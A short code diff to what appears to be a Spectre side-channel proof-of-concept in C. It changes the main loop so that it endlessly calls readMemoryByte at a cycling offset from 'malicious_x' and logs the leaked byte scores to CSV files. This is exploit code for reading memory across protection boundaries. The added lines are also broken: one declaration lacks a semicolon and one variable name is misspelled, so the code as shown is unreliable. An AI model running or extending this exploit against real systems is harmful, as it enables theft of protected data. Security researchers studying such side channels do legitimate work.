@@ -174,10 +174,13 @@ int main(int argc,
   FILE* resfile = fopen("spectre_result.csv", "w");
   FILE* timefile = fopen("spectre_time.csv", "w");
 
+  int offset = 0
   //printf("Reading %d bytes:\n", len);
-  while (--len >= 0) {
+  while (1) {
+    offset += 1;
+    if (offst >= 40) offset = 1;
     //printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-    readMemoryByte(malicious_x++, value, score, results);
+    readMemoryByte(malicious_x+offset, value, score, results);
 
     for (i = 0; i < 256; i++)
       fprintf(resfile, "%d ", results[i]);
